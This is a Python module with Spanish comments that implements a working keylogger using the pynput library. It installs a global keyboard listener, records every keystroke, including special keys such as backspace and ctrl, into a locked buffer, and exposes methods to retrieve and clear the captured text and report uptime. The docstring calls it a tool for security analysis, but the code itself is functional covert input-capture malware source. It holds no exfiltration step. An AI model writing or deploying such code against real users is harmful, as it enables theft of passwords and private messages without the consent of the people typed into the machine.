"""
Módulo de keylogger
Propósito: Captura de teclas para análisis de seguridad
"""

from pynput import keyboard
import threading
import time


class Keylogger:
    """
    Keylogger para captura de teclas
    Captura teclas presionadas y las almacena en un buffer
    """
    
    def __init__(self):
        self.buffer = []
        self.listener = None
        self.running = False
        self.lock = threading.Lock()
        self.start_time = None
    
    def start(self):
        """Inicia la captura de teclas"""
        if self.running:
            return False
        
        try:
            self.listener = keyboard.Listener(on_press=self.on_press)
            self.listener.start()
            self.running = True
            self.start_time = time.time()
            return True
        except Exception as e:
            print(f"[-] Error iniciando keylogger: {e}")
            return False
    
    def stop(self):
        """Detiene la captura de teclas"""
        if not self.running:
            return False
        
        try:
            self.listener.stop()
            self.running = False
            return True
        except Exception as e:
            print(f"[-] Error deteniendo keylogger: {e}")
            return False
    
    def on_press(self, key):
        """Callback que captura cada tecla presionada"""
        try:
            with self.lock:
                if hasattr(key, 'char') and key.char:
                    self.buffer.append(key.char)
                elif key == keyboard.Key.space:
                    self.buffer.append(' ')
                elif key == keyboard.Key.enter:
                    self.buffer.append('\n')
                elif key == keyboard.Key.tab:
                    self.buffer.append('\t')
                elif key == keyboard.Key.backspace:
                    self.buffer.append('[BACKSPACE]')
                elif key == keyboard.Key.esc:
                    self.buffer.append('[ESC]')
                elif key == keyboard.Key.shift:
                    self.buffer.append('[SHIFT]')
                elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
                    self.buffer.append('[CTRL]')
                elif key == keyboard.Key.alt_l or key == keyboard.Key.alt_r:
                    self.buffer.append('[ALT]')
                else:
                    self.buffer.append(f'[{key}]')
        except Exception:
            pass
    
    def get_buffer(self, clear=False):
        """Retorna el buffer como texto"""
        with self.lock:
            text = ''.join(self.buffer)
            if clear:
                self.buffer.clear()
            return text
    
    def clear_buffer(self):
        """Limpia el buffer"""
        with self.lock:
            self.buffer.clear()
    
    def get_status(self):
        """Retorna estado del keylogger"""
        with self.lock:
            uptime = time.time() - self.start_time if self.start_time else 0
            return {
                'running': self.running,
                'keys_captured': len(self.buffer),
                'uptime_seconds': int(uptime)
            }
